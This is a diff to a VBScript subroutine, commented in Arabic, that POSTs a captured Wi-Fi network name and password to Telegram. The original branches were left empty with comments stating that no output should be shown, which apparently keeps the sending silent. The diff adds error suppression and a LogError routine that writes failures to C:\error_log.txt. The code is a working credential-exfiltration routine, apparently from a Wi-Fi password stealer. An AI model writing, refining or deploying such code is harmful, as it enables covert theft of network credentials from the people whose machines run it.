@@ -102,14 +102,28 @@ Sub SendToTelegram(networkName, password)
 
     ' إنشاء كائن XMLHTTP لإرسال الطلب
     Set http = CreateObject("MSXML2.XMLHTTP")
+    On Error Resume Next ' تجاهل الأخطاء مؤقتًا
     http.Open "POST", url, False
     http.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
     http.send postData
 
     ' التحقق من نجاح الإرسال
     If http.status = 200 Then
-        ' لا تفعل شيئًا، لأننا لا نريد إظهار أي مخرجات
+        ' تم الإرسال بنجاح
     Else
-        ' لا تفعل شيئًا، لأننا لا نريد إظهار أي مخرجات
+        ' فشل الإرسال
+        LogError "فشل إرسال البيانات إلى Telegram. الرمز: " & http.status & " - " & http.statusText
     End If
+    On Error GoTo 0 ' إعادة تفعيل التعامل مع الأخطاء
+End Sub
+
+' دالة لتسجيل الأخطاء في ملف نصي
+Sub LogError(errorMessage)
+    Dim fso, logFile
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    ' مسار الملف النصي لتسجيل الأخطاء
+    logFilePath = "C:\error_log.txt"
+    Set logFile = fso.OpenTextFile(logFilePath, 8, True) ' 8 = فتح الملف للإضافة
+    logFile.WriteLine Now & " - " & errorMessage
+    logFile.Close
 End Sub
